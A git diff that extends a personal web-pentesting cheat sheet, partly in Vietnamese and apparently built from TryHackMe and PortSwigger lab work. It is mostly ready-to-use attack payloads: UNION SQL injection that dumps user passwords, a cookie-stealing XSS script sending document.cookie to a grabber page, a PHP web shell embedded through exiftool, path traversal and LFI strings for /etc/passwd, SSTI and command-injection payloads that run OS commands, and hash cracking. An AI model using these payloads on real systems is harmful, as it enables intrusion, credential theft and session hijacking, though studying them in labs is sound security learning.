@@ -1,3 +1,9 @@
+[+] Leo_root:
+	- https://gtfobins.github.io/
+	- sudo cmd
+
+=======================================
+
 [+] RUN_WEB:
 	- sudo service nginx start
 	- /var/www/html/
@@ -8,6 +14,22 @@
 	- kali@kali$ curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
 	- https://wiki.owasp.org/index.php/OWASP_favicon_database
 
+[+] OSINT: 
+	- nmap -T4 -sC -sV -p[start]-[stop] [ip]
+	- site		site:tryhackme.com	returns results only from the specified website address
+	- inurl		inurl:admin		returns results that have the specified word in the URL
+	- filetype	filetype:pdf		returns results which are a particular file extension
+	- intitle	intitle:admin		returns results that contain the specified word in the title
+
+	
+	- find / -type f -name user.txt 2>dev/null
+	- find / -type f -perm /4000 2>dev/null
+
+	- gobuster dir --url https://10-10-203-33.p.thmlabs.com/ -w /home/kali/Desktop/SecLists-master/Discovery/Web-Content/common.txt
+	
+	- └─$ hashcat -O -a 0 -m 10 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlist/rockyou.txt
+				+) 10 | md5($pass.$salt)
+     				+) 20 | md5($salt.$pass)
 =======================================
 
 [+] HIDDEN_DATA:
@@ -15,14 +37,32 @@
 	- Network
 	- robots.txt
 	- sitemap.xml
+=======================================
 
+[+] Reverse_Shell:
+	- https://book.hacktricks.xyz/pentesting-web/file-upload
+	- Content-Type: image/jpeg, png,...
+	- └─$ exiftool -DocumentName="<?php system(‘ls’); __halt_compiler(); ?>" hehe.jpg
+	- đổi tên file thành .php hoặc .php.jpg
+
+=======================================
+
+[+] SQL-injection:
+	- 0 UNION SELECT 1,2,database()
+	- 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+	- 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+	- 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+	- 0 UNION SELECT null,null,null,null,notes FROM people WHERE id = 1--
+	- ' UNION SELECT SLEEP(0.2),null FROM users WHERE username='admin' AND length(password)>1#
+	- limit 1,1
 =======================================
 
 [+] XSS:
 	- innerHTML: Chèn giá trị trực tiếp vào code web
 	- h2:contains(): có thể inject xss
 	- javascript:alert(1) -> xss link
-	- Send web to victim <iframe src="https://0aac00ae043e2f97810b39dd001b00f8.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+	- <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
 
 =======================================
 
@@ -34,4 +74,43 @@
 	+ <proxy1>, <proxy2>: If a request goes through multiple proxies, the IP addresses of each successive proxy is listed. This means that, given well-behaved client and proxies, the rightmost IP address is the IP address of the most recent proxy and the leftmost IP address is the IP address of the originating client.
 
 	- X-Forwarded-Host: attacker.link: Sử dụng để máy chủ có thể biết máy khách muốn giao tiếp với ai
+	
 
+	- int overflow
+	- log -> token
+	- number < 0
+=======================================
+
+[+] Path traversal:
+	- filename=../../../etc/passwd%00.png
+	- ....//....//....//....//
+
+
+=======================================
+
+[+] Logic Vulnerabilities:
+	- Int overflow
+	- Xóa trường mật khẩu cũ
+	- bof email
+
+=======================================
+
+[+] SSTI:
+	- {%import+os;os.system('ls')%}					# python	
+	- ${"freemarker.template.utility.Execute"?new()("id")} 		# java
+	- Handlebars: when an error show in output			# handlebars
+
+=======================================
+
+[+] Command Injection:
+	- & ping -c 10 127.0.0.1 &
+	- & whoami > /var/www/static/whoami.txt &
+	- & nslookup kgji2ohoyw.web-attacker.com &
+	- & - && - | - ||
+
+=======================================
+
+[+] LFI:
+	local file include - include file để dùng làm mẫu cho trang web
+	- ../../../etc/passwd%00.png
+	- link to shell.
